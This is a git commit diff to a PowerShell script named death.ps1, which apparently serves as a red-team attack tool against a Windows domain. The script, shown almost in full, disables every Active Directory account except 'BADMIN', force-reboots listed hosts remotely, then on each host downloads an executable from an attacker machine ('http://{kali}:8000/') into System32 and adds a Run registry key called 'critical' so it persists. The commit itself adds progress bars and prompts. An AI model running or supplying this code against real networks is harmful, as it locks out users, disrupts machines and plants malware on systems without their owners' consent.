3197a795d8b202e5abfaaed4e4ed05cb7f103983
SpaceXElaborator <35696076+SpaceXElaborator@users.noreply.github.com>
2023-02-04 16:04:21 -0800

    Update death.ps1

--- death.ps1
+++ death.ps1
@@ -12,25 +12,45 @@ Write-Host " "
 $hostnames | ForEach-Object { Write-Host $_ }
 Write-Host " "
 Write-Host " "
-Write-Host "Waiting For User Input..."
+Write-Host "Press 'Enter' To Perform Starting Attack"
 Read-Host
 
 Write-Host "Performing Attack...."
-$users | ForEach-Object { Disable-ADAccount -Credential $cred -Identity $_ }
-$hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock { Restart-Computer -Force } }
 
-Write-Host "Press Enter To Continue Attack"
+Write-Host "Disabling All Acounts But BADMIN..."
+$maxUsers = $users.Count
+$currNumber = 0
+$users | ForEach-Object {
+	$currNumber = $currNumber + 1
+	$perTillDone = ($currNumber / $maxUsers) * 100
+	Write-Progress -Activity "Disabling Accounts" -Status "$perTillDone% / 100%" -PercentComplete $perTillDone
+	Disable-ADAccount -Credential $cred -Identity $_ 
+}
+
+Write-Host "Sending Reboot to Hosts..."
+$maxHosts = $hostnames.Count
+$currHostNumber = 0
+$hostnames | ForEach-Object {
+	$currHostNumber = $currHostNumber + 1
+	$perTillDone = ($currHostNumber / $maxHosts) * 100
+	Write-Progress -Activity "Rebooting Windows" -Status "$perTillDone% / 100%" -PercentComplete $perTillDone 
+	Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock { Restart-Computer -Force } 
+}
+
+Write-Host "Hosts Rebooted, Press 'Enter' To Execute Attack"
 Read-Host
 
-$hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock {
-        $url = "http://{kali}:8000/"
-        $hostname = $env:computername
-        $outFile = "C:\Windows\System32\" + $hostname + ".exe"
 
-        Invoke-WebRequest -Uri "$($url+$hostname).exe" -UseBasicParsing -OutFile $outFile
-        $registeryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-        $registeryValue = "cmd.exe /c $($outFile)"
-        Set-ItemProperty -Path $registeryPath -Name "critical" -Value $registeryValue
+Write-Host "Sending Registery Key Command..."
+$hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock {
+	$url = "http://{kali}:8000/"
+	$hostname = $env:computername
+	$outFile = "C:\Windows\System32\" + $hostname + ".exe"
+	
+	Invoke-WebRequest -Uri "$($url+$hostname).exe" -UseBasicParsing -OutFile $outFile
+	$registeryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+	$registeryValue = "cmd.exe /c $($outFile)"
+	Set-ItemProperty -Path $registeryPath -Name "critical" -Value $registeryValue
 }}
 
 Write-Host "Attack Complete"
